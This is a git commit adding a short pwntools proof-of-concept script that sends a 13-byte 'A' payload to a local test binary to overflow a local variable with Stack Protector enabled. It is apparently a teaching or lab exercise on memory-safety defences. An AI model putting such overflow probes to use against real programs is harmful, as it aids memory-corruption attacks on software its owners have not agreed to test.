faf62b681d55254cc5af1b6717cbc297f0e99562
Dongliang Mu <dzm91@hust.edu.cn>
2023-11-19 15:47:48 +0800

    test overflow local variable with Stack Protector enabled

---
+++ test_overflow_local_with_sp/poc.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+binary_path = "./test_overflow"
+
+def print_lines(io):
+    info("printing io received lines")
+    while True:
+        try:
+            line = io.recvline()
+            success(line.decode())
+        except EOFError:
+            break
+
+elf = ELF(binary_path)
+payload = b"A" * 13
+p = process(elf.path)
+p.sendline(payload)
+print_lines(p)
